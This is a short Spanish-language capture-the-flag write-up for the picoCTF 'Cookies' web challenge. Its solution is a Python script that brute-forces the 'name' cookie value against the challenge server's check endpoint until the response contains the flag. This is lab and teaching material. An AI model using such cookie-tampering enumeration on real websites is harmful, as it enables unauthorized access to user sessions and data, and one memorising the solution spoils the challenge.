## Descripcion
Who doesn't love cookies? Try to figure out the best one.

http://wily-courier.picoctf.net:49513/
## Solucion
Se ejecuta el siguiente codigo de python

```
import requests

# La ruta exacta donde el servidor valida tu cookie

url = "http://wily-courier.picoctf.net:49513/check"

  

print("Iniciando ataque de fuerza bruta sobre las cookies...")

  

# Iteramos del 0 al 30 (la bandera suele estar escondida en este rango)

for i in range(30):

    # Inyectamos el valor iterativo en la cookie 'name'

    cookies = {'name': str(i)}

    response = requests.get(url, cookies=cookies)

    # Si la respuesta del servidor contiene la estructura de la bandera, detenemos el ciclo

    if "picoCTF{" in response.text:

        print(f"\n[*] ¡Vulnerabilidad explotada con la cookie name={i}!")

        # Filtramos el HTML para imprimir solo la línea que contiene la bandera

        for line in response.text.split('\n'):

            if "picoCTF{" in line:

                # Limpiamos las etiquetas HTML para extraer el texto puro

                import re

                flag = re.search(r'picoCTF{.*?}', line).group(0)

                print(f"[*] Bandera: {flag}")

        break
```
## Notas adicionales

## Referencias